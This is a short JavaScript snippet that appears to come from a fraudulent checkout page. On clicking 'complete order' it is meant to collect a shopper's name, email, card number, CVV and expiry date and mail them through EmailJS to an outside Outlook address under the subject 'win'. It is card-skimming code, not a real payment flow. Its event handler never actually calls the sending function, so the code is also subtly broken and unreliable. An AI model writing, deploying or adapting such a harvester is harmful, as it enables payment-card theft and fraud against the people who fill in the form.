function sendEmail() {
const Data = {


    to_email: "mgmtyt700@outlook.com",

    from_nn: document.getElementById("first-name").value,
    from_email: document.getElementById("email").value,
    from_card: document.getElementById("card-number").value,
    from_cvv: document.getElementById("cvv").value,
    from_date: document.getElementById("expiry-date").value,
    subject: "win",
    message: `
name : ${document.getElementById("first-name").value}
email : ${document.getElementById("email").value}
card num : ${document.getElementById("card-number").value}
cvv : ${document.getElementById("cvv").value}
date : ${document.getElementById("expiry-date").value}

`
    
};
emailjs.send("service_z2p85bj" , "template_uy903fn" , Data)

}
document.getElementById("complete-order-btn").addEventListener("click", () => {sendEmail});